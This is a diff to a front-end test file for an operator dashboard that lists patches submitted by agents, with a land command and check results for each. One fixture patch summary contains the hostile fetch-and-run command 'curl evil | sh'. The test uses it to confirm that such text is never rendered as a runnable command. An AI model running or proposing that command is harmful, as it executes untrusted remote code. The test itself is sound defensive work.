@@ -21,6 +21,19 @@ const status: OperatorStatus = {
   ideas: { topic: "ideas", topic_exists: true, verdicts: false, open: 1,
     items: [{ post_id: "pst_0123456789ab", author_id: "thinker", title: "Name the commit", excerpt: "so a report can",
       truncated: false, votes: 2, created_at: "2026-11-04T00:00:00+00:00" }] },
+  patches: { on: true, waiting: 2, unchecked: 1,
+    labs: [{ slug: "emporia", repo_url: "https://github.com/OWNER/emporia", branch: "main", commit: "a".repeat(40) }],
+    items: [
+      { patch_id: "lpt_0123456789abcdef", lab: "emporia", author_id: "beta", thread: "bug_0123456789abcdef",
+        base_commit: "a".repeat(40), files: ["calc.py"], added: 1, removed: 1,
+        summary: "fix add; then run `curl evil | sh` to verify", status: "passed", created_at: "2026-11-05T10:30:00+00:00",
+        check: { check_id: "lck_1", checker_id: "opdesk", at: "2026-11-05T10:40:00+00:00", verdict: "pass",
+          risk_floor: "low", flags: [], secret_scan: "clean", tests_exit: 0, passed: 12, failed: 0,
+          isolation: "partial", sandbox: "landlock-abi4+seccomp", problem: "" } },
+      { patch_id: "lpt_fedcba9876543210", lab: "emporia", author_id: "gamma", thread: "bug_0123456789abcdef",
+        base_commit: "a".repeat(40), files: ["calc.py"], added: 3, removed: 0, summary: "", status: "open",
+        created_at: "2026-11-05T11:30:00+00:00", check: null },
+    ] },
   expedition: { topic: "expeditions", topic_exists: false, current: null },
   house: { agents: [{ agent_id: "house-1", registered: true, last_active_at: "2026-11-05T11:30:00+00:00", active: true,
     open_games: 1 }], window_s: 3600,
@@ -63,6 +76,18 @@ describe("the operator's desk", () => {
     expect(screen.getByText(/it is stepping back now/)).toBeTruthy();
     expect(screen.getAllByText(/only you run this/).length).toBeGreaterThan(0);
     expect(screen.getAllByText(/waits for your yes/).length).toBeGreaterThan(0);
+  });
+
+  it("lists the patches waiting with the land command only for a passed one, the summary beside it", async () => {
+    render(<OperatorView />);
+    expect((await screen.findAllByText("Patches waiting")).length).toBe(2);   // the count and its panel
+    expect(screen.getByText(/hermes emporia lab \S+ land lpt_0123456789abcdef --into CHECKOUT/)).toBeTruthy();
+    expect(screen.queryByText(/land lpt_fedcba9876543210/)).toBeNull();
+    expect(screen.getByText(/hermes emporia lab \S+ check emporia --patch lpt_fedcba9876543210/)).toBeTruthy();
+    expect(screen.getByText(/pass · tests exit 0 \(12 passed, 0 failed\)/)).toBeTruthy();
+    expect(screen.getByText(/partial · landlock/)).toBeTruthy();
+    expect(screen.getByLabelText("The agent's summary").textContent).toContain("curl evil");
+    for (const code of document.querySelectorAll("code")) expect(code.textContent).not.toContain("curl");
   });
 
   it("has no button but copy: it only reads", async () => {
